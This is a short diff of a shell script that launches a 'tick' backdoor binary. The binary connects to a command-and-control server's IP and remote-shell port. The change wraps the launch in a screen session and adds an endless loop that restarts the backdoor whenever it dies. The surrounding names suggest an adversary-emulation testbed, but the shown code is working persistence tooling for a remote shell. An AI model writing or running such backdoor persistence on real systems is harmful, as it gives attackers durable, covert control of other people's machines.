@@ -50,7 +50,20 @@ if [ "$benign_process_active" = true ]; then
 	bash ping_behavior.sh 	
 fi
 
+
 # start listening for C&C server
-$tick_backdoor_folder/bin/ticksvc $ip_of_server $port_of_remote_shell
+screen -S tick $tick_backdoor_folder/bin/ticksvc $ip_of_server $port_of_remote_shell
+	
+
+# renew connection to prevent crashes
+while true; do
+
+	if ! screen -list | grep "SCREEN -S tick"; then
+		echo "Restarting tick backdoor"
+		screen -S tick $tick_backdoor_folder/bin/ticksvc $ip_of_server $port_of_remote_shell
+	fi
+	
+	sleep 1
+done
 
 cleanup
